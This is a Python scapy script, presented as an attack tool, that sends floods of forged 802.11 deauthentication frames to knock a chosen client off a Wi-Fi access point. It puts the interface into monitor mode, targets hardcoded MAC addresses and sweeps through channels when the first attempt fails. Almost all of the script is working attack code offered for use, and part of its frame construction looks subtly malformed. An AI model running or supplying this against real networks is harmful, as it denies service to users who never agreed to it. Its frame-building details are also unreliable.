#!/usr/bin/env python3
"""
PERFECT AIRPLAY-EMULATION DEAUTH
Exact frame structure as aireplay-ng
"""

import time
import struct
from scapy.all import *
import threading

def kill_interfering_processes():
    """Kill processes that interfere with monitor mode"""
    print("[*] Killing interfering processes...")
    cmds = [
        "sudo systemctl stop NetworkManager",
        "sudo systemctl stop wpa_supplicant", 
        "sudo pkill -9 wpa_supplicant",
        "sudo pkill -9 dhclient",
        "sudo pkill -9 avahi-daemon"
    ]
    
    for cmd in cmds:
        os.system(cmd + " 2>/dev/null")
    
    time.sleep(2)
    print("[+] Processes killed")

def setup_interface(interface, channel=4):
    """Setup interface in monitor mode"""
    print(f"[*] Setting up {interface}...")
    
    cmds = [
        f"sudo ip link set {interface} down",
        f"sudo iw dev {interface} set type monitor",
        f"sudo ip link set {interface} up",
        f"sudo iw dev {interface} set channel {channel}"
    ]
    
    for cmd in cmds:
        os.system(cmd + " 2>/dev/null")
        time.sleep(0.5)
    
    print(f"[+] Interface {interface} ready (channel {channel})")

def restore_interface(interface):
    """Restore interface to managed mode"""
    print(f"[*] Restoring {interface}...")
    
    cmds = [
        f"sudo ip link set {interface} down",
        f"sudo iw dev {interface} set type managed",
        f"sudo ip link set {interface} up",
        "sudo systemctl start NetworkManager",
        "sudo systemctl start wpa_supplicant"
    ]
    
    for cmd in cmds:
        os.system(cmd + " 2>/dev/null")
        time.sleep(0.5)
    
    print(f"[+] Interface {interface} restored")

def create_aireplay_deauth(dst_mac, src_mac, bssid, seq_num, reason=7):
    """
    Create EXACT deauth frame as aireplay-ng
    Based on Wireshark analysis of aireplay packets
    """
    # Convert MACs to bytes
    dst = bytes.fromhex(dst_mac.replace(':', ''))
    src = bytes.fromhex(src_mac.replace(':', ''))
    bss = bytes.fromhex(bssid.replace(':', ''))
    
    # Frame Control: 0xC000 = Management Deauth
    # Duration: 0x013A = 314 microseconds (STANDARD!)
    # Sequence Control: seq_num << 4 (Fragment 0)
    
    # Build 802.11 frame manually
    frame = struct.pack('<HH', 0xC000, 0x013A)  # FC + Duration
    frame += dst                                # addr1: Destination
    frame += src                                # addr2: Source
    frame += bss                                # addr3: BSSID
    frame += struct.pack('<H', seq_num << 4)    # Sequence Control
    frame += struct.pack('<HH', 0xC000, reason) # Fixed + Reason
    
    # RadioTap header (like aireplay)
    radiotap = bytes([
        0x00, 0x00,             # Header revision
        0x0c, 0x00,             # Header length
        0x04, 0x80, 0x00, 0x00, # Present flags
        0x00, 0x00, 0x00, 0x00  # Flags/data
    ])
    
    return radiotap + frame

def send_aireplay_deauth(ap_mac, client_mac, interface, duration=10):
    """
    Send deauth packets EXACTLY like aireplay-ng
    """
    print(f"\n[+] Starting AIREPLAY-STYLE DEAUTH")
    print(f"    AP: {ap_mac}")
    print(f"    Client: {client_mac}")
    print(f"    Duration: {duration}s")
    
    # Sequence starts from realistic value
    seq_num = 0
    
    # Start time
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Increment sequence
            current_seq = seq_num
            seq_num += 1
            
            # 1. AP -> Client (Reason 7)
            frame1 = create_aireplay_deauth(
                dst_mac=client_mac,
                src_mac=ap_mac,
                bssid=ap_mac,
                seq_num=current_seq,
                reason=7
            )
            
            # 2. Client -> AP (Reason 3)
            current_seq += 1
            frame2 = create_aireplay_deauth(
                dst_mac=ap_mac,
                src_mac=client_mac,
                bssid=ap_mac,
                seq_num=current_seq,
                reason=3
            )
            
            # 3. Broadcast (Reason 7)
            current_seq += 1
            frame3 = create_aireplay_deauth(
                dst_mac="ff:ff:ff:ff:ff:ff",
                src_mac=ap_mac,
                bssid=ap_mac,
                seq_num=current_seq,
                reason=7
            )
            
            # Send all frames
            sendp(Raw(frame1), iface=interface, verbose=0)
            sendp(Raw(frame2), iface=interface, verbose=0)
            sendp(Raw(frame3), iface=interface, verbose=0)
            
            packet_count += 3
            
            # Same timing as aireplay (10ms between packets)
            time.sleep(0.01)
            
            # Progress
            elapsed = time.time() - start_time
            print(f"\r    Packets: {packet_count} | Time: {elapsed:.1f}s", end="")
    
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    
    print(f"\n[+] Attack complete: {packet_count} packets sent")
    return packet_count

def test_injection(interface):
    """Test if packet injection works"""
    print("[*] Testing packet injection...")
    
    # Simple test packet
    test_frame = create_aireplay_deauth(
        dst_mac="11:22:33:44:55:66",
        src_mac="aa:bb:cc:dd:ee:ff",
        bssid="aa:bb:cc:dd:ee:ff",
        seq_num=1000,
        reason=7
    )
    
    try:
        sendp(Raw(test_frame), iface=interface, count=5, verbose=0)
        print("[+] Injection test successful")
        return True
    except Exception as e:
        print(f"[!] Injection failed: {e}")
        return False

def main():
    """Main function"""
    
    # CONFIGURATION
    AP = "74:fe:ce:15:5c:90"
    CLIENT = "ec:ed:73:21:3e:c6"
    IFACE = "wlp3s0f3u3"
    CHANNEL = 4  # Channel of your AP
    DURATION = 10  # Attack duration in seconds
    
    print("""
╔═══════════════════════════════════════════╗
║    AIREPLAY-EMULATION DEAUTH ATTACK      ║
║           EXACT FRAME STRUCTURE          ║
╚═══════════════════════════════════════════╝
    """)
    
    # Kill interfering processes
    kill_interfering_processes()
    
    # Setup interface
    setup_interface(IFACE, CHANNEL)
    
    # Test injection
    if not test_injection(IFACE):
        print("[!] Injection test failed. Check:")
        print("    1. Interface in monitor mode")
        print("    2. Correct driver supports injection")
        print("    3. No other processes using interface")
        restore_interface(IFACE)
        return
    
    # Run attack
    print(f"\n{'='*60}")
    print(f"Starting attack in 3 seconds...")
    print(f"Make sure client {CLIENT} is connected to AP {AP}")
    print("Press Ctrl+C to stop early")
    print(f"{'='*60}")
    
    time.sleep(3)
    
    try:
        # Send deauth packets
        packets = send_aireplay_deauth(AP, CLIENT, IFACE, DURATION)
        
        # Ask if worked
        print(f"\n{'='*60}")
        response = input("Did the client disconnect from Wi-Fi? (y/n): ").lower()
        
        if response == 'y':
            print("[✅] SUCCESS! Attack worked perfectly!")
            print("     This proves the frame structure is correct")
        else:
            print("[⚠️] Client did not disconnect. Possible reasons:")
            print("     1. PMF (802.11w) enabled on router")
            print("     2. Client ignores deauth frames")
            print("     3. Signal too weak")
            print("     4. Wrong channel")
            
            # Try different channel
            print("\n[*] Trying different channels...")
            for ch in [1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13]:
                print(f"    Trying channel {ch}")
                os.system(f"sudo iw dev {IFACE} set channel {ch}")
                time.sleep(0.5)
                
                # Send quick burst
                frame = create_aireplay_deauth(
                    dst_mac=CLIENT, src_mac=AP, bssid=AP,
                    seq_num=2000, reason=7
                )
                sendp(Raw(frame), iface=IFACE, count=10, verbose=0)
                
                time.sleep(1)
    
    except Exception as e:
        print(f"[!] Error during attack: {e}")
    
    finally:
        # Always restore interface
        print(f"\n{'='*60}")
        print("[*] Cleaning up...")
        restore_interface(IFACE)
        print("[+] Cleanup complete!")

if __name__ == "__main__":
    import os
    
    # Check if root
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        print("    Use: sudo python3 deauth.py")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
        # Try to restore interface
        os.system(f"sudo ip link set wlp3s0f3u3 down 2>/dev/null")
        os.system(f"sudo iw dev wlp3s0f3u3 set type managed 2>/dev/null")
        os.system(f"sudo ip link set wlp3s0f3u3 up 2>/dev/null")
        print("[+] Interface restored")
